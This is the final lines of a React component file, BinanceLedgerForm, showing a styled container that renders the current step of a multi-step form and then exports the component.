        style={{ backgroundColor: "var(--color-Card, #1E2329)" }}
      >
        {renderCurrentStep()}
      </div>
    </div>
  );
};

export default BinanceLedgerForm;
